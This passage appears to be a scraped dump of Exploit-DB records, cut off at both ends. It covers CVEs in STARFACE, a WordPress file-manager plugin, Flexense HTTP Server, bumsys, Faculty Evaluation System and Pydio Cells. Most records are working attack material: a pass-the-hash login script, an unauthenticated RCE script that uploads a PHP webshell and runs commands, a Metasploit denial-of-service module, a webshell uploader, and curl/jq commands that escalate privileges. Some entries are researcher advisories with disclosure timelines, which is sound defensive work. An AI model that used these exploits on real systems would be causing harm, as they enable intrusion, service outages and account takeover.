contain the username and password entered into the form respectively. const createHash = function (isAD, user, pass, nonces) { if (isAD) { return forAD.encode(user + nonces + pass); return user + ':' + forSF(user + nonces + forSF(pass)); The expression right after the second return statement is the implementation used when Active Directory login is disabled which is the default setting. The return value is composed of the username separated via a colon from a value built using the ""forSF()"" function. The ""forSF()"" function was found to calculate the SHA512 hash value. When considering the arguments passed to the function, the hash is calculated as follows: SHA512(username + defaultVals.k + defaultVals.bk + SHA512(password)) As can be seen, instead of the cleartext password the SHA512 hash of the password is used in the calculation. In conclusion, for the form value ""secret"" the following value is transmitted: username + "":"" + SHA512( username + defaultVals.k + defaultVals.bk + SHA512(password) If the SHA512 hash of a user's password is known, it can be directly used in the calculation of the ""secret"" during the login process. Knowledge of the cleartext password is not required. This finding was also verified by analysing the decompiled Java code of the server component. It was also found that the authentication process of the REST API is vulnerable in a very similar manner. Proof of Concept The following Python script can be used to perform a login by specifying a target URL, a username and the associated password hash: #!/usr/bin/env python3 import click import hashlib import re import requests import typing def getvaluesfromsession(url, session) -> typing.Tuple[str, str]: k, bk = , responsecontent = session.get(f""{url}/jsp/index.jsp"").text kresult = re.search(""\sk : '([^']+)'"", responsecontent) bkresult = re.search(""\sbk : '([^']+)'"", responsecontent) if kresult != None: k = kresult.group(1) if bkresult != None: bk = bkresult.group(1) return k, bk def weblogin(url, login, pwhash, session) -> bool: version, nonce = getvaluesfromsession(url, session) if version == or nonce == : print(""Web Login failed: Nonce and version hash can not be retrieved."") return value = login + version + nonce + pwhash secret = hashlib.sha512(value.encode(""utf-8"")).hexdigest() data = { ""forward"": """", ""autologin"": ""false"", ""secret"": f""{login}:{secret}"", ""ack"": version, loginrequest = session.post( f""{url}/login"", data=data, allowredirects=False, headers={""Referer"": f""{url}/jsp/index.jsp""}, responseheaders = loginrequest.headers if ""Set-Cookie"" in responseheaders: sessionid = responseheaders[""Set-Cookie""].split(""="")[1].split("";"")[0] print(f""Session ID: {sessionid}"") return True else: print(""Invalid login data"") return False def getnoncefromapi(url, session) -> str: responsecontent = session.get(f""{url}/rest/login"").json() return responsecontent[""nonce""] if ""nonce"" in responsecontent else def restlogin(url, login, pwhash, session): nonce = getnoncefromapi(url, session) if nonce == : print(""REST Login failed: Nonce can not be retrieved."") return value = login + nonce + pwhash secret = hashlib.sha512(value.encode(""utf-8"")).hexdigest() data = {""loginType"": ""Internal"", ""nonce"": nonce, ""secret"": f""{login}:{secret}""} loginrequest = session.post( f""{url}/rest/login"", json=data, headers={""Content-Type"": ""application/json"", ""X-Version"": ""2""}, responsedata = loginrequest.json() token = responsedata[""token""] if ""token"" in responsedata else ""none"" print(f""REST API Token: {token}"") .command() .option('--url', help='Target System URL', required=True) .option('--login', help='Login ID', required=True) .option('--pwhash', help='Password Hash', required=True) def login(url, login, pwhash): session = requests.session() strippedurl = url.rstrip(""/"") result = weblogin(strippedurl, login, pwhash, session) if result: restlogin(strippedurl, login, pwhash, session) if name == ""main"": login() For example, the SHA512 hash of the password ""starface"" can be calculated as follows: $ echo -n ""starface"" | sha512sum a37542915e834f6e446137d759cdcb825a054d0baab73fd8db695fc49529bc8e52eb27979dd1dcc21849567bac74180f6511121f76f4a2a1f196670b7375f8ec - The Python script can be run as follows to perform a login as the user ""0001"" with the aforementioned hash: $ python3 login.py --url ' <URL> --login 0001 --pwhash 'a37542915e834f6e446137d759cdcb825a054d0baab73fd8db695fc49529bc8e52eb27979dd1dcc21849567bac74180f6511121f76f4a2a1f196670b7375f8ec' Session ID: 2CF09656E274F000FFAD023AF37629CE REST API Token: 51eef8f8vp3d3u81k0imjbuuu7 When the password hash is valid for the specified user of the targeted instance a session ID as well as a REST API token is returned. Afterwards, these values can be used to interact with the web application and the REST API. Workaround None Fix On 4 May 2023, version 8.0.0.11 was released. In this version the vulnerability was addressed with a temporary solution, such that the password hashes are encrypted before they are saved in the database. This approach prevents attackers from exploiting this vulnerability in scenarios where they have only acquired pure database access. However, attackers with system level access can bypass this temporary measure as they can extract the encryption key and decrypt the hashes in the database. A solution that fixes this vulnerability entirely is still in progress. Security Risk The web interface and REST API of STARFACE allow to login using the password hash instead of the cleartext password. This can be exploited by attackers who gained access to the application's database where the passwords are also saved as a SHA512 hash of the cleartext passwords. While the precondition for this attack could be the full compromise of the STARFACE PBX, another attack scenario could be that attackers acquire access to backups of the database stored on another system. Furthermore, the login via password hash allows attackers for permanent unauthorised access to the web interface even if system access was obtained only temporarily. Due to the prerequisites of obtaining access to password hashes, the vulnerability poses a low risk only. Timeline 2022-12-06 Vulnerability identified 2022-12-13 Customer approved disclosure to vendor 2023-01-11 Vendor notified 2023-05-04 Vendor released new version 8.0.0.11 2023-05-19 CVE ID requested 2023-05-20 CVE ID assigned 2023-06-01 Advisory released References [0] <URL> [1] <URL> RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: <URL> Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: <URL> RedTeam Pentesting GmbH Tel.: +49 241 510081-0 Alter Posthof 1 Fax : +49 241 510081-99 52062 Aachen <URL> Germany Registergericht: Aachen HRB 14004 Geschäftsführer: Patrick Hof, Jens Liebchen"
CVE-2023-2068,"{""CVE-2023-2068"": 1}",2023-06-04,File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51505,"Exploit Title: File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution (RCE) Date: 05/31/2023 Exploit Author: Mateus Machado Tesser Vendor Homepage: <URL> Version: File Manager Advanced Shortcode 2.3.2 Tested on: Wordpress 6.1 / Linux (Ubuntu) 5.15 CVE: CVE-2023-2068 import requests import json import pprint import sys import re PROCESS = ""\033[1;34;40m[]\033[0m"" SUCCESS = ""\033[1;32;40m[+]\033[0m"" FAIL = ""\033[1;31;40m[-]\033[0m"" try: COMMAND = sys.argv[2] IP = sys.argv[1] if len(COMMAND) > 1: pass if IP: pass else: print(f'Use: {sys.argv[0]} IP COMMAND') except: pass url = ' <URL> Path to File Manager Advanced Shortcode Panel print(f""{PROCESS} Searching fmakey"") try: r = requests.get(url) raw_fmakey = r.text fmakey = re.findall('_fmakey.$',rawfmakey,re.MULTILINE)[0].split(""'"")[1] if len(fmakey) == 0: print(f""{FAIL} Cannot found fmakey!"") except: print(f""{FAIL} Cannot found fmakey!"") print(f'{PROCESS} Exploiting Unauthenticated Remote Code Execution via AJAX!') url = "" <URL> headers = {""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36"", ""Content-Type"": ""multipart/form-data; boundary=-WebKitFormBoundaryI52DGCOt37rixRS1"", ""Accept"": ""*/*""} data = ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""reqid\""\r\n\r\n\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""cmd\""\r\n\r\nupload\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""target\""\r\n\r\nl1Lw\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""hashes[l1cG5nLWNsaXBhcnQtaGFja2VyLWhhY2tlci5wbmc]\""\r\n\r\nexploit.php\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""action\""\r\n\r\nfmaloadshortcodefmaui\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""fmakey\""\r\n\r\n""+fmakey+""\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""path\""\r\n\r\n\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""url\""\r\n\r\n\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""w\""\r\n\r\nfalse\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""r\""\r\n\r\ntrue\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""hide\""\r\n\r\nplugins\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""operations\""\r\n\r\nupload,download\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""pathtype\""\r\n\r\ninside\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""hidepath\""\r\n\r\nno\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""enabletrash\""\r\n\r\nno\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""uploadallow\""\r\n\r\ntext/x-php\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""uploadmaxsize\""\r\n\r\n2G\r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""upload[]\""; filename=\""exploit2.php\""\r\nContent-Type: text/x-php\r\n\r\n \r\n"" data += ""-WebKitFormBoundaryI52DGCOt37rixRS1\r\nContent-Disposition: form-data; name=\""mtime[]\""\r\n\r\n\r\n-WebKitFormBoundaryI52DGCOt37rixRS1--\r\n"" r = requests.post(url, headers=headers, data=data) print(f""{PROCESS} Sending AJAX request to: {url}"") if 'errUploadMime' in r.text: print(f'{FAIL} Exploit failed!') sys.exit() elif r.headers['Content-Type'].startswith(""text/html""): print(f'{FAIL} Exploit failed! Try to change _fmakey') sys.exit(0) else: print(f'{SUCCESS} Exploit executed with success!') exploited = json.loads(r.text) url = """" print(f'{PROCESS} Getting URL with webshell') for i in exploited[""added""]: url = i['url'] print(f""{PROCESS} Executing '{COMMAND}'"") r = requests.get(url+'?cmd='+COMMAND) print(f'{SUCCESS} The application returned ({len(r.text)} length):\n'+r.text)"
CVE-2018-8065,"{""CVE-2018-8065"": 1}",2023-05-31,Flexense HTTP Server 10.6.24 - Buffer Overflow (DoS) (Metasploit),https://www.exploit-db.com/exploits/51493,"Exploit Title: Flexense HTTP Server 10.6.24 - Buffer Overflow (DoS) (Metasploit) Date: 2018-03-09 Exploit Author: Ege Balci Vendor Homepage: <URL> Version: <= 10.6.24 CVE : CVE-2018-8065 This module requires Metasploit: <URL> Current source: <URL> class MetasploitModule < Msf::Auxiliary include Msf::Auxiliary::Dos include Msf::Exploit::Remote::Tcp def initialize(info = {}) super(updateinfo(info, 'Name' => 'Flexense HTTP Server Denial Of Service', 'Description' => %q{ This module triggers a Denial of Service vulnerability in the Flexense HTTP server. Vulnerability caused by a user mode write access memory violation and can be triggered with rapidly sending variety of HTTP requests with long HTTP header values. Multiple Flexense applications that are using Flexense HTTP server 10.6.24 and below vesions reportedly vulnerable. 'Author' => [ 'Ege Balci ' ], 'License' => MSFLICENSE, 'References' => [ 'CVE', '2018-8065'], [ 'URL', ' <URL> ], 'DisclosureDate' => '2018-03-09')) registeroptions( Opt::RPORT(80), OptString.new('PacketCount', [ true, ""The number of packets to be sent (Recommended: Above 1725)"" , 1725 ]), OptString.new('PacketSize', [ true, ""The number of bytes in the Accept header (Recommended: 4088-5090"" , rand(4088..5090) ]) end def check begin connect sock.put(""GET / HTTP/1.0\r\n\r\n"") res = sock.get if res and res.include? 'Flexense HTTP Server v10.6.24' Exploit::CheckCode::Appears else Exploit::CheckCode::Safe end rescue Rex::ConnectionRefused printerror(""Target refused the connection"") Exploit::CheckCode::Unknown rescue printerror(""Target did not respond to HTTP request"") Exploit::CheckCode::Unknown end end def run unless check == Exploit::CheckCode::Appears failwith(Failure::NotVulnerable, 'Target is not vulnerable.') end size = datastore['PacketSize'].toi printstatus(""Starting with packets of #{size}-byte strings"") count = 0 loop do payload = """" payload << ""GET /"" + Rex::Text.randtextalpha(rand(30)) + "" HTTP/1.1\r\n"" payload << ""Host: 127.0.0.1\r\n"" payload << ""Accept: ""+('A' * size)+""\r\n"" payload << ""\r\n\r\n"" begin connect sock.put(payload) disconnect count += 1 break if count==datastore['PacketCount'] rescue ::Rex::InvalidDestination printerror('Invalid destination! Continuing.') rescue ::Rex::ConnectionTimeout printerror('Connection timeout! Continuing.') rescue ::Errno::ECONNRESET printerror('Connection reset! Continuing.') rescue ::Rex::ConnectionRefused printgood(""DoS successful after #{count} packets with #{size}-byte headers"") return true end end print_error(""DoS failed after #{count} packets of #{size}-byte strings"") end end"
CVE-2023-0455,"{""CVE-2023-0455"": 1}",2023-05-31,unilogies/bumsys v1.0.3 beta - Unrestricted File Upload,https://www.exploit-db.com/exploits/51492,"Exploit Title: - unilogies/bumsys v1.0.3-beta - Unrestricted File Upload Google Dork : NA Date: 19-01-2023 Exploit Author: AFFAN AHMED Vendor Homepage: <URL> Software Link: <URL> Version: 1.0.3-beta Tested on: Windows 11, XAMPP-8.2.0 CVE : CVE-2023-0455 StepsTOReproduce - Navigate to this URL:[ <URL> - Click on action button to edit the Profile - Click on select logo button to upload the image - Intercept the POST Request and do the below changes . Burpsuite-Request POST /xhr/?module=settings&page=updateShop HTTP/1.1 Host: demo.bumsys.org Cookie: eid=1; currencySymbol=%EF%B7%BC; keepAlive=1; 0bb0b4aaf0f729565dbdb80308adac3386976ad3=9lqop41ssg3i9trh73enqbi0i7 Content-Length: 1280 Sec-Ch-Ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99"" X-Csrf-Token: 78abb0cc27ab54e87f66e8160dab3ab48261a8b4 Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Content-Type: multipart/form-data; boundary=-WebKitFormBoundarynO0QAD84ekUMuGaA Accept: / X-Requested-With: XMLHttpRequest Sec-Ch-Ua-Platform: ""Windows"" Origin: <URL> Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: <URL> Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopName"" TEST -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopAddress"" test -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopCity"" testcity -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopState"" teststate -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopPostalCode"" 700056 -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopCountry"" testIND -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopPhone"" 895623122 -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopEmail"" test.com -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopInvoiceFooter"" -WebKitFormBoundarynO0QAD84ekUMuGaA Content-Disposition: form-data; name=""shopLogo""; filename=""profile picture.php"" Content-Type: image/png = Burpsuite-Response HTTP/1.1 200 OK Date: Thu, 19 Jan 2023 07:14:26 GMT Server: Apache/2.4.51 (Unix) OpenSSL/1.0.2k-fips X-Powered-By: PHP/7.0.33 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Connection: close Content-Type: text/html; charset=UTF-8 Content-Length: 65 Shop successfully updated. = VIDEO-"
CVE-2023-0527,"{""CVE-2023-0527"": 1}",2023-05-31,Online Security Guards Hiring System 1.0 - Reflected XSS,https://www.exploit-db.com/exploits/51494,Exploit Title: Online Security Guards Hiring System 1.0 – REFLECTED XSS Google Dork : NA Date: 23-01-2023 Exploit Author : AFFAN AHMED Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Windows 11 + XAMPP + PYTHON-3.X CVE : CVE-2023-0527 NOTE: TO RUN THE PROGRAM FIRST SETUP THE CODE WITH XAMPP AND THEN RUN THE BELOW PYTHON CODE TO EXPLOIT IT Below code check for both the parameter /admin-profile.php and in /search.php
CVE-2023-33440,"{""CVE-2023-33440"": 1}",2023-05-31,Faculty Evaluation System 1.0 - Unauthenticated File Upload,https://www.exploit-db.com/exploits/51495,"Exploit Title: Faculty Evaluation System 1.0 - Unauthenticated File Upload Date: 5/29/2023 Author: Alex Gan Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: LAMP Fedora server 38 (Thirty Eight) Apache/2.4.57 10.5.19-MariaDB PHP 8.2.6 CVE: CVE-2023-33440 References: <URL> # <URL> # <URL> #!/usr/bin/env python3 import os import sys import requests import argparse from bs4 import BeautifulSoup from urllib.parse import urlparse from requests.exceptions import ConnectionError, Timeout def getargs(): parser = argparse.ArgumentParser() parser.addargument('-u', '--url', type=str, help='URL') parser.addargument('-p', '--payload', type=str, help='PHP webshell') return parser.parseargs() def getuserinput(args): if not (args.url): args.url = input('Use the -u argument or Enter URL:') if not (args.payload): args.payload = input('Use the -p argument or Enter file path PHP webshell: ') return args.url, args.payload def checkinputurl(url): parsedurl = urlparse(url) if not parsedurl.scheme: url = ' <URL> + url if parsedurl.path.endswith('/'): url = url.rstrip('/') return url def checkhostavailability(url): try: response = requests.head(url=url + '/login.php') if response.statuscode == 200: print(""[+] Host is accessible"") else: print(""[-] Host is not accessible"") print("" Status code:"", response.statuscode) sys.exit() except (ConnectionError, Timeout) as e: print(""[-] Host is not accessible"") sys.exit() except requests.exceptions.RequestException as e: print(""[-] Error:"", e) sys.exit() def makerequest(url, method, files=None): if method == 'GET': response = requests.get(url) elif method == 'POST': response = requests.post(url, files=files) else: raise ValueError(f'Invalid HTTP method: {method}') if response.statuscode == 200: print('[+] Request successful') return response.text else: print(f'[-] Error {response.statuscode}: {response.text}') return None def findfile(responseget, filename, findurl): soup = BeautifulSoup(responseget, 'html.parser') links = soup.findall('a') foundfiles = [] for link in links: fileupl = link.get('href') if fileupl.endswith(filename): foundfiles.append(fileupl) if foundfiles: print(' File found:') for file in foundfiles: print('[] ' + file) print(' Full URL of your file:') for file_url in found_files: print('[] ' + findurl + fileurl) else: print('[-] File not found') def main(): args = getargs() url, payload = getuserinput(args) url = checkinputurl(url) checkhostavailability(url) posturl = url + ""/ajax.php?action=saveuser"" geturl = url + ""/assets/uploads/"" filename = os.path.basename(payload) payloadfile = [('img',(filename,open(args.payload,'rb'),'application/octet-stream'))] print("" Loading payload file"") makerequest(posturl, 'POST', files=payloadfile) print("" Listing the uploads directory"") responseget = makerequest(geturl, 'GET') print("" Finding the downloaded payload file"") findfile(responseget, filename, geturl) if name == ""main"": main()"
CVE-2023-32749,"{""CVE-2023-32749"": 1}",2023-05-31,Pydio Cells 4.1.2 - Unauthorised Role Assignments,https://www.exploit-db.com/exploits/51496,"Exploit Title: Pydio Cells 4.1.2 - Unauthorised Role Assignments Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Privilege Escalation Security Risk: high Vendor URL: <URL> Vendor Status: notified Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-32749 CVE URL: <URL> Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform (DSC) specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" (from the vendor's homepage) More Details Users can share cells or folders with other users on the same Pydio instance. The web application allows to either select an already existing user from a list or to create a new user by entering a new username and password, if this functionality is enabled. When creating a new user in this way, a HTTP PUT request like the following is sent: PUT /a/user/newuser HTTP/2 Host: example.com User-Agent: agent Authorization: Bearer O48gvjD[.] Content-Type: application/json Content-Length: 628 Cookie: token=AO[.] ""Attributes"": { ""profile"": ""shared"", ""parameter:core.conf:lang"": ""\""en-us\"""", ""sendemail"": ""false"" ""Roles"": [], ""Login"": ""newuser"", ""Password"": ""secret!"", ""GroupPath"": ""/"", ""Policies"": [.] The JSON object sent in the body contains the username and password for the user to be created and an empty list for the key ""Roles"". The response contains a JSON object similar to the following: ""Uuid"": ""58811c4c-2286-4ca0-8e8a-14ab9dbca8ce"", ""GroupPath"": ""/"", ""Attributes"": { ""parameter:core.conf:lang"": ""\""en-us\"""", ""profile"": ""shared"" ""Roles"": [ ""Uuid"": ""EXTERNALUSERS"", ""Label"": ""External Users"", ""Policies"": [.] ""Uuid"": ""58811c4c-2286-4ca0-8e8a-14ab9dbca8ce"", ""Label"": ""User newuser"", ""UserRole"": true, ""Policies"": [.] ""Login"": ""newuser"", ""Policies"": [.], ""PoliciesContextEditable"": true The key ""Roles"" now contains a list with two objects, which seem to be applied by default. The roles list in the HTTP request can be modified to contain a list of all available UUIDs for roles, which can be obtained by using the user search functionality. This results in a new user account with all roles applied. By performing a login as the newly created user, access to all cells and non-personal workspaces of the whole Pydio instance is granted. Proof of Concept Login to the Pydio Cells web interface with a regular user and retrieve the JWT from the HTTP requests. This can either be done using an HTTP attack proxy or using the browser's developer tools. Subsequently, curl [1] can be used as follows to retrieve a list of all users and their roles: $ export JWT="" "" $ curl --silent \ --header ""Authorization: Bearer $TOKEN"" \ --header 'Content-Type: application/json' \ --data '{}' \ <URL> | tee allusers.json {""Users"":[.]} Afterwards, jq [2] can be used to create a JSON document which can be sent to the Pydio REST-API in order to create the external user ""foobar"" with the password ""hunter2"" and all roles assigned: $ jq '.Users[].Roles' allusers.json \ | jq -s 'flatten | .[].Uuid | {Uuid: .}' \ | jq -s 'unique' \ | jq '{""Login"": ""foobar"", ""Password"": ""hunter2"", ""Attributes"": {""profile"": ""shared""}, ""Roles"": .}' \ | tee createuser.json ""Login"": ""foobar"", ""Password"": ""hunter2"", ""Attributes"": { ""profile"": ""shared"" ""Roles"": [.] Finally, the following curl command can be issued to create the new external user: $ curl --request PUT \ --silent \ --header ""Authorization: Bearer $JWT"" \ --header 'Content-Type: application/json' \ --data .json \ <URL> Now, login with the newly created user to access all cells and non-personal workspaces. Workaround Disallow the creation of external users in the authentication settings. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk Attackers with access to any regular user account for a Pydio Cells instance can extend their privileges by creating a new external user with all roles assigned. Subsequently, they can access all folders and files in any cell and workspace, except for personal workspaces. The creation of external users is activated by default. Therefore, the vulnerability is estimated to pose a high risk. Timeline 2023-03-23 Vulnerability identified 2023-05-02 Customer approved disclosure to vendor 2023-05-02 Vendor notified 2023-05-03 CVE ID requested 2023-05-08 Vendor released fixed version 2023-05-14 CVE ID assigned 2023-05-16 Vendor asks for a few more days before the advisory is released 2023-05-30 Advisory released References [1] <URL> [2] <URL> RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: <URL> Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: <URL>"
CVE-2023-32751,"{""CVE-2023-32751"": 1}",2023-05-31,Pydio Cells 4.1.2 - Cross-Site Scripting (XSS) via File Download,https://www.exploit-db.com/exploits/51497,"Exploit Title: Pydio Cells 4.1.2 - Cross-Site Scripting (XSS) via File Download Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Cross-Site Scripting Security Risk: high Vendor URL: <URL> Vendor Status: notified Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-32751 CVE URL: <URL> Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform (DSC) specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" (from the vendor's homepage) More Details When a file named ""xss.html"" is downloaded in the Pydio Cells web application, a download URL similar to the following is generated: <URL> ?AWSAccessKeyId=gateway &Expires=1682495748 &Signature=920JV0Zy%2BrNYXjak7xksAxRpRp8%3D &response-content-disposition=attachment%3B%20filename%3Dxss.html &pydiojwt=qIe9DUut-OicxRzNVlynMf6CTENB0J-J[.] The URL is akin to a presigned URL as used by the Amazon S3 service. It contains the URL parameter ""response-content-disposition"" which is set to ""attachment"" causing the response to contain a ""Content-Disposition"" header with that value. Therefore, the browser downloads the file instead of interpreting it. The URL also contains a signature and expiry timestamp, which are checked by the backend. Unlike a presigned URL as used by S3, the URL also contains the parameter ""pydiojwt"" with the JWT of the user for authentication. Furthermore, the access key with the ID ""gateway"" is referenced, which can be found in the JavaScript sources of Pydio Cells together with the secret: awsSdk.default.config.update({ accessKeyId: 'gateway', secretAccessKey: 'gatewaysecret', s3ForcePathStyle: !0, httpOptions: { timeout: PydioApi.getMultipartUploadTimeout() With this information it is possible to change the URL parameter ""response-content-disposition"" to the value ""inline"" and then calculate a valid signature for the resulting URL. Furthermore, the content type of the response can be changed to ""text/html"" by also adding the URL parameter ""response-content-type"" with that value. This would result in a URL like the following for the previously shown example URL: <URL> AWSAccessKeyId=gateway &Expires=1682495668 &Signature=HpKue0YQZrnp%2B665Jf1t7ONgfRg%3D &response-content-disposition=inline &response-content-type=text%2Fhtml &pydiojwt=qIe9DUut-OicxRzNVlynMf6CTENB0J-J[.] Upon opening the URL in a browser, the HTML included in the file is interpreted and any JavaScript code is run. Proof of Concept Upload a HTML file into an arbitrary location of a Pydio Cells instance. For example with the following contents: - Cross-Site Scriping - The contained JavaScript code reads the JWT access token for Pydio Cells from the browser's local storage object and opens a message box. Instead of just displaying the JWT, it could also be sent to an attacker. The following JavaScript function can then be run within the browser's developer console to generate a presigned URL for the HTML file: async function getPresignedURL(path) { let client = PydioApi.getClient(); let node = new AjxpNode(path); let metadata = {Bucket: ""io"", ResponseContentDisposition: ""inline"", Key: path, ResponseContentType: ""text/html""}; let url = await client.buildPresignedGetUrl(node, null, ""text/html"", metadata); return url; await getPresignedURL(""xss/xss.html""); The code has to be run in context of Pydio Cells while being logged in. If the resulting URL is opened in a browser, the JavaScript code contained in the HTML file is run. If the attack is conducted in the described way, the JWT of the attacker is exposed through the URL. However, this can be circumvented by first generating a public URL for the file and then constructing the presigned URL based on the resulting download URL. Workaround No workaround known. Fix Upgrade Pydio Cells to a version without the vulnerability. Security Risk Attackers that can upload files to a Pydio Cells instance can construct URLs that execute arbitrary JavaScript code in context of Pydio Cells upon opening. This could for example be used to steal the authentication tokens of users opening the URL. It is likely that such an attack succeeds, since sharing URLs to files hosted using Pydio Cells is a common use case of the application. Therefore, the vulnerability is estimated to pose a high risk. Timeline 2023-03-23 Vulnerability identified 2023-05-02 Customer approved disclosure to vendor 2023-05-02 Vendor notified 2023-05-03 CVE ID requested 2023-05-08 Vendor released fixed version 2023-05-14 CVE ID assigned 2023-05-16 Vendor asks for a few more days before the advisory is released 2023-05-30 Advisory released References [1] <URL> RedTeam Pentesting GmbH RedTeam Pentesting offers individual penetration tests performed by a team of specialised IT-security experts. Hereby, security weaknesses in company networks or products are uncovered and can be fixed immediately. As there are only few experts in this field, RedTeam Pentesting wants to share its knowledge and enhance the public knowledge with research in security-related areas. The results are made available as public security advisories. More information about RedTeam Pentesting can be found at: <URL> Working at RedTeam Pentesting RedTeam Pentesting is looking for penetration testers to join our team in Aachen, Germany. If you are interested please visit: <URL> RedTeam Pentesting GmbH Tel.: +49 241 510081-0 Alter Posthof 1 Fax : +49 241 510081-99 52062 Aachen <URL> Germany Registergericht: Aachen HRB 14004 Geschäftsführer: Patrick Hof, Jens Liebchen"
CVE-2023-32750,"{""CVE-2023-32750"": 1}",2023-05-31,Pydio Cells 4.1.2 - Server-Side Request Forgery,https://www.exploit-db.com/exploits/51498,"Exploit Title: Pydio Cells 4.1.2 - Server-Side Request Forgery Affected Versions: 4.1.2 and earlier versions Fixed Versions: 4.2.0, 4.1.3, 3.0.12 Vulnerability Type: Server-Side Request Forgery Security Risk: medium Vendor URL: <URL> Vendor Status: notified Advisory URL: <URL> Advisory Status: published CVE: CVE-2023-32750 CVE URL: <URL> Introduction ""Pydio Cells is an open-core, self-hosted Document Sharing and Collaboration platform (DSC) specifically designed for organizations that need advanced document sharing and collaboration without security trade-offs or compliance issues."" (from the vendor's homepage) More Details Using the REST-API of Pydio Cells it is possible to start jobs. For example, when renaming a file or folder an HTTP request similar to the following is sent: PUT /a/jobs/user/move HTTP/2 Host: example.com User-Agent: agent Accept: application/json Authorization: Bearer G4ZRN[.] Content-Type: application/json Content-Length: 140 ""JobName"": ""move"", ""JsonParameters"": ""{\""nodes\"":[\""cell/file.txt\""],\""target\"":\""cell/renamed.txt\"",\""targetParent\"":false}"" The body contains a JSON object with a job name and additional parameters for the job. Besides the ""move"" job, also a job with the name ""remote-download"" exists. It takes two additional parameters: ""urls"" and ""target"". In the ""urls"" parameter, a list of URLs can be specified and in the parameter ""target"" a path can be specified in which to save the response. When the job is started, HTTP GET requests are sent from the Pydio Cells server to the specified URLs. The responses are saved into a file, which are uploaded to the specified folder within Pydio Cells. Potential errors are transmitted in a WebSocket channel, which can be opened through the ""/ws/event"" endpoint. Proof of Concept Log into Pydio Cells and retrieve the JWT from the HTTP requests. Then, run the following commands to start a 